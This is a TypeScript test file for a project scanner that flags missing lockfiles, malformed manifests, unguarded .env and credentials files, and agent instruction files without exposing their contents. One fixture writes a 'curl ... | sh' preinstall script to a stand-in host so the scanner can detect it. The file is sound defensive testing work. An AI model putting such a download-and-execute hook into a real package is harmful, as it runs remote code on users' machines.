import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import test from "node:test";
import { scanProjectFindings } from "../src/findings/project-findings.js";

async function withProject(run: (projectPath: string) => Promise<void>): Promise<void> {
  const projectPath = await mkdtemp(join(tmpdir(), "livariant-findings-"));
  try {
    await run(projectPath);
  } finally {
    await rm(projectPath, { recursive: true, force: true });
  }
}

test("clean locked Node project returns no supported v1 findings", async () => {
  await withProject(async (projectPath) => {
    await writeFile(resolve(projectPath, "package.json"), JSON.stringify({ name: "clean", scripts: { test: "node --test" } }));
    await writeFile(resolve(projectPath, "package-lock.json"), "{}\n");

    const report = scanProjectFindings(projectPath);
    assert.equal(report.state, "clear");
    assert.deepEqual(report.summary, { critical: 0, high: 0, medium: 0, low: 0 });
    assert.equal(report.changesMade, 0);
  });
});

test("package manifest without declared install dependencies does not create lockfile noise", async () => {
  await withProject(async (projectPath) => {
    await writeFile(resolve(projectPath, "package.json"), JSON.stringify({ name: "manifest-only", scripts: { test: "node --test" } }));

    const report = scanProjectFindings(projectPath);
    assert.ok(!report.findings.some((candidate) => candidate.ruleId === "LV-FND-QUAL-003"));
  });
});

test("declared dependencies without a lockfile are surfaced with stable material-bound identity", async () => {
  await withProject(async (projectPath) => {
    await writeFile(resolve(projectPath, "package.json"), JSON.stringify({ name: "unlocked", dependencies: { react: "^19.0.0" } }));

    const first = scanProjectFindings(projectPath);
    const second = scanProjectFindings(projectPath);
    const item = first.findings.find((candidate) => candidate.ruleId === "LV-FND-QUAL-003");
    const repeated = second.findings.find((candidate) => candidate.ruleId === "LV-FND-QUAL-003");
    assert.ok(item);
    assert.ok(repeated);
    assert.equal(item.severity, "medium");
    assert.equal(item.confidence, "strong");
    assert.match(item.id, /^finding-v1:[a-f0-9]{64}$/u);
    assert.equal(item.id, repeated.id);
  });
});

test("dangerous package download-and-execute script is a strong security finding", async () => {
  await withProject(async (projectPath) => {
    await writeFile(resolve(projectPath, "package.json"), JSON.stringify({
      name: "dangerous-script",
      scripts: { preinstall: "curl https://example.invalid/install.sh | sh" },
    }));
    await writeFile(resolve(projectPath, "package-lock.json"), "{}\n");

    const report = scanProjectFindings(projectPath);
    const item = report.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-002");
    assert.ok(item);
    assert.equal(item.category, "security");
    assert.equal(item.severity, "high");
    assert.equal(item.confidence, "strong");
    assert.ok(item.evidence.some((evidence) => evidence.path === "package.json#scripts.preinstall"));
  });
});

test("malformed package manifest becomes a high-confidence quality finding", async () => {
  await withProject(async (projectPath) => {
    await writeFile(resolve(projectPath, "package.json"), "{ not-json\n");

    const report = scanProjectFindings(projectPath);
    const item = report.findings.find((candidate) => candidate.ruleId === "LV-FND-QUAL-001");
    assert.ok(item);
    assert.equal(item.severity, "high");
    assert.equal(item.confidence, "strong");
  });
});

test("non-file package manifest is not followed or interpreted", async () => {
  await withProject(async (projectPath) => {
    await mkdir(resolve(projectPath, "package.json"));

    const report = scanProjectFindings(projectPath);
    const item = report.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-001");
    assert.ok(item);
    assert.equal(item.category, "security");
    assert.equal(item.confidence, "strong");
  });
});

test("sensitive root-file rule never reads or exposes the secret contents", async () => {
  await withProject(async (projectPath) => {
    await mkdir(resolve(projectPath, ".git"));
    const secret = "LIVARIANT_TEST_SECRET_MUST_NOT_LEAK";
    await writeFile(resolve(projectPath, ".env"), `TOKEN=${secret}\n`);

    const report = scanProjectFindings(projectPath);
    const item = report.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-003");
    assert.ok(item);
    assert.equal(item.confidence, "moderate");
    assert.doesNotMatch(JSON.stringify(report), new RegExp(secret));
  });
});

test("non-regular sensitive root path is reported without being interpreted", async () => {
  await withProject(async (projectPath) => {
    await mkdir(resolve(projectPath, ".git"));
    await mkdir(resolve(projectPath, ".env"));

    const report = scanProjectFindings(projectPath);
    const item = report.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-004");
    assert.ok(item);
    assert.equal(item.severity, "high");
    assert.equal(item.confidence, "strong");
    assert.ok(item.evidence.some((evidence) => evidence.path === ".env" && /not a regular file/u.test(evidence.detail)));
  });
});

test("empty gitignore does not suppress a sensitive-file finding", async () => {
  await withProject(async (projectPath) => {
    await mkdir(resolve(projectPath, ".git"));
    await writeFile(resolve(projectPath, ".env"), "TOKEN=hidden\n");
    await writeFile(resolve(projectPath, ".gitignore"), "# intentionally empty\n");

    const report = scanProjectFindings(projectPath);
    assert.ok(report.findings.some((candidate) => candidate.ruleId === "LV-FND-SEC-003"));
  });
});

test("exact root gitignore entry suppresses only the explicitly guarded sensitive file", async () => {
  await withProject(async (projectPath) => {
    await mkdir(resolve(projectPath, ".git"));
    await writeFile(resolve(projectPath, ".env"), "TOKEN=hidden\n");
    await writeFile(resolve(projectPath, "credentials.json"), "do-not-read\n");
    await writeFile(resolve(projectPath, ".gitignore"), "/.env\n");

    const report = scanProjectFindings(projectPath);
    const item = report.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-003");
    assert.ok(item);
    assert.ok(item.evidence.some((evidence) => evidence.path === "credentials.json"));
    assert.ok(!item.evidence.some((evidence) => evidence.path === ".env"));
  });
});

test("later exact gitignore negation re-opens the sensitive-file finding", async () => {
  await withProject(async (projectPath) => {
    await mkdir(resolve(projectPath, ".git"));
    await writeFile(resolve(projectPath, ".env"), "TOKEN=hidden\n");
    await writeFile(resolve(projectPath, ".gitignore"), ".env\n!.env\n");

    const report = scanProjectFindings(projectPath);
    assert.ok(report.findings.some((candidate) => candidate.ruleId === "LV-FND-SEC-003"));
  });
});

test("all sensitive files with effective exact root ignore entries do not create the hygiene finding", async () => {
  await withProject(async (projectPath) => {
    await mkdir(resolve(projectPath, ".git"));
    await writeFile(resolve(projectPath, ".env"), "TOKEN=hidden\n");
    await writeFile(resolve(projectPath, "credentials.json"), "do-not-read\n");
    await writeFile(resolve(projectPath, ".gitignore"), ".env\n/credentials.json\n");

    const report = scanProjectFindings(projectPath);
    assert.ok(!report.findings.some((candidate) => candidate.ruleId === "LV-FND-SEC-003"));
  });
});

test("different native agent instruction files are surfaced without exposing their contents", async () => {
  await withProject(async (projectPath) => {
    const claudeText = "Never expose CLAUDE private wording.\n";
    const agentsText = "Never expose AGENTS private wording.\n";
    await writeFile(resolve(projectPath, "CLAUDE.md"), claudeText);
    await writeFile(resolve(projectPath, "AGENTS.md"), agentsText);

    const report = scanProjectFindings(projectPath);
    const item = report.findings.find((candidate) => candidate.ruleId === "LV-FND-QUAL-004");
    assert.ok(item);
    assert.equal(item.severity, "medium");
    const serialized = JSON.stringify(report);
    assert.doesNotMatch(serialized, /Never expose CLAUDE private wording/);
    assert.doesNotMatch(serialized, /Never expose AGENTS private wording/);
    assert.ok(item.evidence.every((evidence) => evidence.detail.startsWith("sha256:")));
  });
});
